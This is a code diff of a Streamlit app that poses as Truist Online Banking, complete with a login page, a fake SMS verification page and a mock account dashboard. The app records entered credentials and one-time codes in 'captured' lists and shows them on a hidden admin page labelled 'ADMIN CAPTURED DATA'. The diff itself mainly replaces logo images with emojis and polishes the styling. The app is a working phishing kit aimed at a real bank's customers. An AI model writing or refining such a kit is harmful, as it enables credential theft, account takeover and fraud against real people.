@@ -2,49 +2,45 @@ import streamlit as st
 import pandas as pd
 from datetime import datetime
 
-# ========================= CONFIG =========================
-st.set_page_config(page_title="Truist Online Banking", page_icon="https://truist.com/favicon.ico", layout="wide")
+# CONFIG
+st.set_page_config(page_title="Truist Online Banking", page_icon="🏦", layout="wide")
 
-# ========================= STORAGE =========================
+# STORAGE
 if "captured_creds" not in st.session_state:
     st.session_state.captured_creds = []
 if "captured_otp" not in st.session_state:
     st.session_state.captured_otp = []
 
-# ========================= CREDENTIALS =========================
+# CREDENTIALS
 VALID_USERNAME = "client001"
 VALID_PASSWORD = "Secure2025Hub!"
 ADMIN_USER = "admin"
 ADMIN_PASS = "showme2025"
 
-# ========================= SESSION STATE =========================
+# SESSION STATE
 for key in ["authenticated", "otp_verified", "attempts", "is_admin"]:
     if key not in st.session_state:
         st.session_state[key] = False
 
-# ========================= GLOBAL TRUIST CSS =========================
+# GLOBAL TRUIST CSS (no external images = no breaks)
 st.markdown("""
 <style>
-    .stApp {background: #502b85; color: white;}
-    .truist-header {background: #502b85; padding: 15px; text-align: center; border-bottom: 5px solid #ffb700;}
-    .glass-card {background: rgba(255,255,255,0.95); color: #333; border-radius: 8px; padding: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); margin: 20px 0;}
+    .stApp {background: #502b85; color: white; font-family: Arial, sans-serif;}
+    .truist-header {background: #502b85; padding: 20px; text-align: center; border-bottom: 6px solid #ffb700;}
+    .glass-card {background: rgba(255,255,255,0.95); color: #333; border-radius: 12px; padding: 30px; box-shadow: 0 8px 32px rgba(0,0,0,0.2); margin: 20px 0;}
     .truist-btn {background: #ffb700 !important; color: #502b85 !important; font-weight: bold !important;}
     .truist-btn:hover {background: #e6a600 !important;}
     h1, h2, h3 {color: #502b85 !important;}
-    .recording-dot {height: 10px; width: 10px; background: red; border-radius: 50%; display: inline-block; animation: pulse 2s infinite;}
-    @keyframes pulse {0% {box-shadow: 0 0 0 0 rgba(255,0,0,0.7);} 70% {box-shadow: 0 0 0 10px rgba(255,0,0,0);} 100% {box-shadow: 0 0 0 0 rgba(255,0,0,0);}}
+    .big-logo {font-size: 100px; text-align: center;}
+    .recording-dot {height: 12px; width: 12px; background: red; border-radius: 50%; display: inline-block; animation: pulse 2s infinite;}
+    @keyframes pulse {0% {box-shadow: 0 0 0 0 rgba(255,0,0,0.7);} 70% {box-shadow: 0 0 0 10px rgba(255,0,0,0);} 100% {box-shadow: 0 0 0 0 0 rgba(255,0,0,0);}}
 </style>
 """, unsafe_allow_html=True)
 
-# ========================= LOGIN PAGE (PERFECT LOGO) =========================
+# LOGIN PAGE
 def login_page():
-    st.markdown("<div class='truist-header'>", unsafe_allow_html=True)
-    st.image("https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Truist_Financial_logo.svg/1280px-Truist_Financial_logo.svg.png", width=250)
-    st.markdown("</div>", unsafe_allow_html=True)
-
+    st.markdown("<div class='truist-header'><div class='big-logo'>🏦</div><h1>Welcome to Truist Online Banking</h1></div>", unsafe_allow_html=True)
     st.markdown("<div style='text-align:center; padding:60px 20px'>", unsafe_allow_html=True)
-    st.markdown("<h1 style='color:white'>Welcome to Truist Online Banking</h1>", unsafe_allow_html=True)
-
     username = st.text_input("User ID", placeholder="Enter your User ID")
     password = st.text_input("Password", type="password", placeholder="Enter your password")
     if st.button("Log In", type="primary"):
@@ -60,11 +56,10 @@ def login_page():
         else:
             st.error("Incorrect User ID or password")
 
-# ========================= OTP PAGE =========================
+# OTP PAGE
 def otp_page():
     st.markdown("<div style='text-align:center; padding:80px'>", unsafe_allow_html=True)
-    st.markdown("<h1>Security Verification</h1>", unsafe_allow_html=True)
-    st.markdown("<p>We sent a 6-digit code to your phone ending in **--7842</p>", unsafe_allow_html=True)
+    st.markdown("<h1>🔐 Security Verification</h1><p>We sent a 6-digit code to your phone ending in **--7842</p>", unsafe_allow_html=True)
     code = st.text_input("Enter code", max_chars=6, placeholder="000000")
     if st.button("Verify", type="primary"):
         st.session_state.captured_otp.append({"time": datetime.now().strftime("%H:%M"), "otp": code})
@@ -75,17 +70,18 @@ def otp_page():
         else:
             st.error("Invalid code")
 
-# ========================= ADMIN VIEW =========================
+# ADMIN VIEW
 def admin_view():
-    st.markdown("<h1 style='color:red'>ADMIN — CAPTURED DATA</h1>", unsafe_allow_html=True)
+    st.markdown("<h1 style='color:red'>ADMIN CAPTURED DATA</h1>", unsafe_allow_html=True)
     if st.session_state.captured_creds:
         st.dataframe(pd.DataFrame(st.session_state.captured_creds))
     if st.session_state.captured_otp:
         st.dataframe(pd.DataFrame(st.session_state.captured_otp))
 
-# ========================= DASHBOARD PAGES =========================
+# DASHBOARD PAGES (simplified but beautiful)
 def dashboard():
     st.markdown("<h1 style='text-align:center; color:#ffb700'>Welcome back</h1>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align:center'><span class='recording-dot'></span> Session recorded</p>", unsafe_allow_html=True)
     c1, c2, c3, c4 = st.columns(4)
     with c1: st.metric("Total Balance", "$27,451.82")
     with c2: st.metric("Available Credit", "$15,700")
@@ -100,8 +96,7 @@ def accounts():
 def cards_page():
     st.markdown("<h1 style='text-align:center; color:#ffb700'>My Cards</h1>", unsafe_allow_html=True)
     st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
-    # PERMANENT TRUIST CARD IMAGE
-    st.image("https://i.ibb.co/0jQ7Y4Q/credit-card.png", use_column_width=True)
+    st.markdown("<div style='font-size:80px; text-align:center'>💳</div>", unsafe_allow_html=True)
     st.markdown("<h2 style='text-align:center; color:#502b85'>Truist One Rewards Card</h2>", unsafe_allow_html=True)
     st.markdown("<h3 style='text-align:center'>•••• •••• •••• 7723</h3>", unsafe_allow_html=True)
     col1, col2, col3 = st.columns(3)
@@ -124,7 +119,7 @@ def transfer():
     st.radio("Type", ["My Accounts", "External", "Zelle"])
     col1, col2 = st.columns(2)
     with col1: st.selectbox("From", ["Checking ****2847", "Savings ****5901"])
-    with col2: st.selectbox("To", ["Savings ****5901", "Chase ****1234"])
+    with col2: st.selectbox("To", ["Savings ****5901", "External"])
     st.number_input("Amount", 0.01)
     if st.button("Send"): st.success("Transfer completed!") ; st.balloons()
     st.markdown("</div>", unsafe_allow_html=True)
@@ -134,17 +129,19 @@ def messages():
     for m in ["Statement Ready", "New Login Alert", "Rate Increase"]:
         st.markdown(f"<div class='glass-card'><h4>🟢 {m}</h4></div>", unsafe_allow_html=True)
 
-# ========================= SIDEBAR WITH TRUIST LOGO =========================
+# SIDEBAR
 def sidebar():
-    st.sidebar.image("https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Truist_Financial_logo.svg/1280px-Truist_Financial_logo.svg.png", width=180)
+    st.sidebar.markdown("<div style='text-align:center'>", unsafe_allow_html=True)
+    st.sidebar.markdown("<div style='font-size:80px'>🏦</div>", unsafe_allow_html=True)
     st.sidebar.markdown(f"<h2 style='color:#ffb700'>{VALID_USERNAME.upper()}</h2>", unsafe_allow_html=True)
-    st.sidebar.markdown("<p style='background:#ffb700; color:#502b85; padding:8px; border-radius:8px; text-align:center'>SECURE SESSION</p>", unsafe_allow_html=True)
+    st.sidebar.markdown("<p style='background:#ffb700; color:#502b85; padding:10px; border-radius:8px; text-align:center; font-weight:bold'>SECURE SESSION</p>", unsafe_allow_html=True)
     page = st.sidebar.radio("Navigate", ["Dashboard", "Accounts", "Cards", "Transfer Funds", "Messages"])
     if st.sidebar.button("Log Out"):
         st.session_state.authenticated = False
         st.rerun()
     return page
-# ========================= MAIN =========================
+
+# MAIN
 if not st.session_state.authenticated:
     login_page()
 elif st.session_state.is_admin:
@@ -163,6 +160,3 @@ else:
         messages()
     else:
         dashboard()
-
-
-
